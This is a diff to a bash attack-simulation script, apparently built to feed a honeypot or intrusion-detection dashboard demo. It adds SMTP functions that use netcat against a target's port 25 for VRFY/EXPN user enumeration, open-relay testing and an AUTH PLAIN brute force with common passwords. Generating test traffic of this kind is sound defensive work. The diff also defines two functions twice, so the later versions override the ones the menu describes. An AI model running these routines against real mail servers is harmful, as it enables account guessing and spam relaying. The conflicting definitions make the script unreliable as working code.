@@ -186,7 +186,93 @@ attack_http_attack(){
     ok "HTTP scan done"
 }
 
-# ── ATTACK 12: FULL DEMO ─────────────────────────────────────
+
+# ── ATTACK 12: Normal SMTP simulation ────────────────────────
+attack_smtp_normal(){
+    log "Attack 12: Normal SMTP — simulates legitimate mail client"
+    log "  This should appear as a NORMAL node (not blocked)"
+    DOMAINS="gmail.com yahoo.com outlook.com company.com"
+    for domain in $DOMAINS; do
+        (
+            sleep 0.3
+            printf "EHLO mail.${domain}\r\n"
+            sleep 0.3
+            printf "MAIL FROM:<sender@${domain}>\r\n"
+            sleep 0.3
+            printf "RCPT TO:<admin@prod-server-01.local>\r\n"
+            sleep 0.3
+            printf "DATA\r\n"
+            sleep 0.2
+            printf "Subject: Test\r\nHello\r\n.\r\n"
+            sleep 0.3
+            printf "QUIT\r\n"
+            sleep 0.3
+        ) | nc -w5 $TARGET 25 2>/dev/null
+        sleep 0.5
+    done
+    ok "Normal SMTP done"
+}
+
+# ── ATTACK 13: SMTP probe / spam relay test ───────────────────
+attack_smtp_probe(){
+    log "Attack 13: SMTP probe — relay test + user enum → Probe rule"
+    # VRFY user enumeration
+    for user in root admin postmaster nobody www-data; do
+        (
+            sleep 0.2
+            printf "EHLO attacker.evil.com\r\n"
+            sleep 0.2
+            printf "VRFY ${user}\r\n"
+            sleep 0.2
+            printf "QUIT\r\n"
+        ) | nc -w3 $TARGET 25 2>/dev/null &
+        sleep 0.2
+    done
+    wait
+    sleep 1
+    # Open relay test
+    for i in $(seq 1 5); do
+        (
+            sleep 0.2
+            printf "EHLO attacker.evil.com\r\n"
+            sleep 0.2
+            printf "MAIL FROM:<spam@evil.com>\r\n"
+            sleep 0.2
+            printf "RCPT TO:<victim@external-domain.com>\r\n"
+            sleep 0.2
+            printf "QUIT\r\n"
+        ) | nc -w3 $TARGET 25 2>/dev/null &
+        sleep 0.15
+    done
+    wait
+    ok "SMTP probe done"
+}
+
+# ── ATTACK 14: SMTP brute force ───────────────────────────────
+attack_smtp_brute(){
+    log "Attack 14: SMTP AUTH brute force → Brute Force + Multi-Service"
+    USERS="admin root postmaster mail user"
+    PASSES="password 123456 admin mail smtp"
+    for user in $USERS; do
+        for pass in $PASSES; do
+            (
+                sleep 0.2
+                printf "EHLO attacker.evil.com\r\n"
+                sleep 0.2
+                # Base64 encode user:pass (simulate AUTH LOGIN)
+                B64=$(echo -ne "\x00${user}\x00${pass}" | base64 2>/dev/null || echo "dXNlcjpwYXNz")
+                printf "AUTH PLAIN ${B64}\r\n"
+                sleep 0.2
+                printf "QUIT\r\n"
+            ) | nc -w3 $TARGET 25 2>/dev/null &
+            sleep 0.15
+        done
+    done
+    wait
+    ok "SMTP brute force done"
+}
+
+# ── ATTACK 15: FULL DEMO ─────────────────────────────────────
 attack_full_demo(){
     echo ""
     echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
@@ -231,7 +317,28 @@ attack_full_demo(){
     wait
     sleep 4
 
-    echo ""; log "Phase 5/5: Telnet Brute Force on Cowrie (port 2223)..."
+    echo ""; log "Phase 5/6: SMTP probe + brute force (port 25)..."
+    for user in admin root postmaster; do
+        for pass in password 123456 admin; do
+            (
+                sleep 0.2
+                printf "EHLO attacker.evil.com\r\n"
+                sleep 0.2
+                printf "VRFY ${user}\r\n"
+                sleep 0.2
+                printf "MAIL FROM:<spam@evil.com>\r\n"
+                sleep 0.2
+                printf "RCPT TO:<victim@external.com>\r\n"
+                sleep 0.2
+                printf "QUIT\r\n"
+            ) | nc -w3 $TARGET 25 2>/dev/null &
+            sleep 0.2
+        done
+    done
+    wait
+    sleep 4
+
+    echo ""; log "Phase 6/6: Telnet Brute Force on Cowrie (port 2223)..."
     for user in root admin guest; do
         for pass in password admin 123456; do
             (
@@ -252,10 +359,81 @@ attack_full_demo(){
     echo -e "${GREEN} DEMO COMPLETE — dashboard should show:${NC}"
     echo "  • Red probe node for your IP"
     echo "  • Rules: Port Scan + Multi-Service + Rapid Conn + Brute Force"
-    echo "  • Service nodes: ssh, telnet, ftp, http (with distinct colors)"
+    echo "  • Service nodes: ssh, telnet, ftp, http, smtp (with distinct colors)"
     echo "  • Port range buckets for wide scan"
     echo "  • IP auto-blocked"
     echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+}
+
+
+# ── ATTACK: SMTP probe ───────────────────────────────────────
+attack_smtp_probe(){
+    log "SMTP probe on port 25 → SMTP service node"
+    for i in $(seq 1 5); do
+        (
+            sleep 0.3
+            echo "EHLO attacker.evil.com"
+            sleep 0.3
+            echo "VRFY root"
+            sleep 0.3
+            echo "VRFY admin"
+            sleep 0.3
+            echo "MAIL FROM:<hacker@evil.com>"
+            sleep 0.3
+            echo "RCPT TO:<root@localhost>"
+            sleep 0.3
+            echo "QUIT"
+        ) | nc -w4 $TARGET 25 2>/dev/null &
+        sleep 0.5
+    done
+    wait
+    ok "SMTP probe done"
+}
+
+# ── ATTACK: SMTP user enumeration ────────────────────────────
+attack_smtp_enum(){
+    log "SMTP user enumeration → SMTP brute force pattern"
+    USERS="root admin postmaster webmaster info sales support noreply"
+    for user in $USERS; do
+        (
+            sleep 0.2
+            echo "EHLO scanner.evil.com"
+            sleep 0.2
+            echo "VRFY $user"
+            sleep 0.2
+            echo "EXPN $user"
+            sleep 0.2
+            echo "QUIT"
+        ) | nc -w3 $TARGET 25 2>/dev/null &
+        sleep 0.3
+    done
+    wait
+    ok "SMTP enumeration done"
+}
+
+# ── ATTACK: Normal SMTP send (simulates legit mail) ──────────
+attack_smtp_normal(){
+    log "Normal SMTP email send (legitimate traffic pattern)"
+    (
+        sleep 0.3
+        echo "EHLO mail.example.com"
+        sleep 0.3
+        echo "MAIL FROM:<sender@example.com>"
+        sleep 0.3
+        echo "RCPT TO:<user@localhost>"
+        sleep 0.3
+        echo "DATA"
+        sleep 0.3
+        echo "Subject: Test email"
+        echo "From: sender@example.com"
+        echo "To: user@localhost"
+        echo ""
+        echo "This is a normal test email."
+        echo "."
+        sleep 0.3
+        echo "QUIT"
+    ) | nc -w5 $TARGET 25 2>/dev/null
+    ok "Normal SMTP send done"
 }
 
 # ── MENU ─────────────────────────────────────────────────────
@@ -271,9 +449,12 @@ echo "  8)  OS fingerprint scan        → Aggressive detection"
 echo "  9)  Vulnerability script scan  → Banner grab + scripts"
 echo "  10) Distributed attack sim     → Multi-wave attack"
 echo "  11) HTTP path enumeration      → HTTP attack node"
-echo "  12) FULL DEMO (all phases)     ← USE THIS FOR PANEL"
+echo "  12) Normal SMTP simulation     → NORMAL node (not blocked)"
+echo "  13) SMTP probe / relay test    → Multi-Service + Probe"
+echo "  14) SMTP brute force           → Brute Force rule"
+echo "  15) FULL DEMO (all phases)     ← USE THIS FOR PANEL"
 echo ""
-read -p "Choice [1-12]: " c
+read -p "Choice [1-15]: " c
 case $c in
     1)  attack_portscan ;;
     2)  attack_service_scan ;;
@@ -286,6 +467,9 @@ case $c in
     9)  attack_vuln_scan ;;
     10) attack_distributed ;;
     11) attack_http_attack ;;
-    12) attack_full_demo ;;
+    12) attack_smtp_normal ;;
+    13) attack_smtp_probe ;;
+    14) attack_smtp_brute ;;
+    15) attack_full_demo ;;
     *)  echo "Invalid choice"; exit 1 ;;
 esac
